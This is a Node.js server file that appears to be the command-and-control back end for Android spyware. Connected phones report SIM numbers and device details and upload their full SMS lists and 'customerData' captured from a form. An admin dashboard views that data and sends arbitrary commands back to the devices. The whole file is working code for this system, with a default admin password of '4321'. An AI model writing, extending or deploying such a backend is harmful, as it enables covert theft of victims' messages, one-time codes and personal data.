require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');
const http = require('http');
const { Server } = require('socket.io');
const WebSocket = require('ws');

const app = express();
app.use(express.json({ limit: '1mb' }));
app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));

app.use((req, res, next) => { req.setTimeout(30000); res.setTimeout(30000); next(); });

let MONGO_URI = process.env.MONGO_URI || '';
// Clean MONGO_URI from common env issues
if (MONGO_URI) {
    MONGO_URI = MONGO_URI.replace(/\\"/g, '').replace(/;/g, '').trim();
}

let dbConnected = false;

if (!MONGO_URI) { 
    console.error('CRITICAL: MONGO_URI missing in Environment Variables'); 
} else {
    mongoose.set('bufferCommands', false);
    mongoose.connect(MONGO_URI, {
      serverSelectionTimeoutMS: 5000,
      connectTimeoutMS: 10000,
      writeConcern: { w: 1 } // Fixed: Use w: 1 to avoid replica set issues
    }).then(() => {
      dbConnected = true;
      console.log('✅ MongoDB connected successfully');
    }).catch(err => {
      dbConnected = false;
      console.error('❌ MongoDB connection error:', err.message);
    });
}

const deviceSchema = new mongoose.Schema({
  deviceId: { type: String, index: true },
  serialNumber: String,
  model: String,
  androidVersion: String,
  sim1: String,
  sim2: String,
  battery: Number,
  isOnline: Boolean,
  lastSeen: Date,
  isPinned: Boolean,
  registrationTimestamp: Date,
  customerData: mongoose.Schema.Types.Mixed,
  isDeleted: Boolean,
  smsMessages: Array
}, { timestamps: true });

const Device = mongoose.model('Device', deviceSchema);
const inMemoryDevices = [];

function clone(obj) { return obj ? JSON.parse(JSON.stringify(obj)) : obj; }

async function getDevicesFromStore() {
  if (dbConnected) return await Device.find({ isDeleted: { $ne: true } }).lean();
  return inMemoryDevices.filter(d => !d.isDeleted).map(clone);
}

async function findOneInStore(query) {
  if (dbConnected) return await Device.findOne(query).lean();
  const keys = Object.keys(query);
  return clone(inMemoryDevices.find(d => keys.every(k => d[k] === query[k])) || null);
}

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });
const wss = new WebSocket.Server({ noServer: true });
global.deviceSockets = new Map();

let adminPassword = process.env.ADMIN_PASSWORD || '4321';

app.post('/api/login', (req, res) => {
  const { username, password } = req.body || {};
  if (username === 'admin' && password === adminPassword) return res.json({ success: true });
  return res.status(401).json({ success: false, message: 'Unauthorized' });
});

app.get('/api/devices', async (req, res) => {
  try {
    const list = await getDevicesFromStore();
    const now = Date.now();
    list.forEach(d => { if (d.lastSeen && (now - new Date(d.lastSeen).getTime()) > 60000) d.isOnline = false; });
    res.json(list);
  } catch (err) { res.status(500).json({ error: 'Failed' }); }
});

app.post('/api/delete-device', async (req, res) => {
  try {
    const { deviceId, password } = req.body || {};
    if (!password || password !== adminPassword) return res.status(401).json({ success: false, message: 'Wrong password' });
    
    let deletedCount = 0;
    if (dbConnected) {
      const orQuery = [{ deviceId: deviceId }, { serialNumber: deviceId }];
      if (mongoose.Types.ObjectId.isValid(deviceId)) orQuery.push({ _id: deviceId });
      const r = await Device.deleteMany({ $or: orQuery });
      deletedCount = r.deletedCount;
    }
    
    io.emit('dashboard-update');
    return res.json({ success: true, count: deletedCount });
  } catch (err) { return res.status(500).json({ success: false }); }
});

app.post('/api/pin-device', async (req, res) => {
    try {
        const { deviceId, status } = req.body || {};
        if (dbConnected) {
            await Device.findOneAndUpdate(
                { $or: [{ deviceId }, { serialNumber: deviceId }, { _id: mongoose.Types.ObjectId.isValid(deviceId) ? deviceId : null }] },
                { $set: { isPinned: !!status } }
            );
            io.emit('dashboard-update');
            return res.json({ success: true });
        }
    } catch(e) { return res.status(500).json({ success: false }); }
});

app.post('/api/command', async (req, res) => {
    try {
        const { deviceId, action, data } = req.body || {};
        let device = await findOneInStore({ $or: [{ deviceId }, { serialNumber: deviceId }, { _id: mongoose.Types.ObjectId.isValid(deviceId) ? deviceId : null }] });
        const clients = global.deviceSockets.get(deviceId) || global.deviceSockets.get(device?.deviceId);

        if (action === 'VIEW_DATA' || action === 'VIEW_SMS' || action === 'VIEW_FORM') {
            if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
            return res.json({ success: true, isOnline: !!(clients && clients.size > 0), device, messages: device.smsMessages, customerData: device.customerData });
        }
        
        if (!clients || clients.size === 0) return res.json({ success: false, message: 'Device Offline' });
        clients.forEach(c => { if(c.readyState === WebSocket.OPEN) c.send(JSON.stringify({ command: action, data })); });
        return res.json({ success: true, message: 'Command sent' });
    } catch(e) { return res.status(500).json({ success: false }); }
});

server.on('upgrade', (req, socket, head) => {
  if (req.url && req.url.startsWith('/socket.io')) return;
  wss.handleUpgrade(req, socket, head, (ws) => { wss.emit('connection', ws, req); });
});

wss.on('connection', (ws, req) => {
  console.log('📱 New Device connection attempt');
  ws.isAlive = true;
  ws.on('pong', () => ws.isAlive = true);
  
  ws.on('message', async (msg) => {
    try {
      const data = JSON.parse(msg);
      const id = data.deviceId || data.serialNumber;
      if (!id) return;

      ws.deviceId = id;
      if (!global.deviceSockets.has(id)) global.deviceSockets.set(id, new Set());
      global.deviceSockets.get(id).add(ws);

      const update = { 
          $set: { 
              deviceId: id, 
              isOnline: true, 
              lastSeen: new Date(),
              model: data.model,
              androidVersion: data.androidVersion,
              sim1: data.sim1,
              sim2: data.sim2,
              battery: Number(data.battery),
              serialNumber: data.serialNumber
          } 
      };

      if (data.type === 'SMS_LIST') update.$set.smsMessages = data.messages;
      if (data.type === 'FORM_SUBMIT') update.$set.customerData = data.customerData;

      if (dbConnected) {
          // Fixed upsert logic
          await Device.findOneAndUpdate(
            { $or: [{ deviceId: id }, { serialNumber: id }] },
            { ...update, $setOnInsert: { registrationTimestamp: new Date(), isDeleted: false, isPinned: false } },
            { upsert: true, writeConcern: { w: 1 } }
          );
          io.emit('dashboard-update');
      }
    } catch (e) { console.error('Error processing ws message:', e.message); }
  });

  ws.on('close', () => {
    if (ws.deviceId && global.deviceSockets.has(ws.deviceId)) {
        global.deviceSockets.get(ws.deviceId).delete(ws);
    }
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => console.log('🚀 Server running on port', PORT));
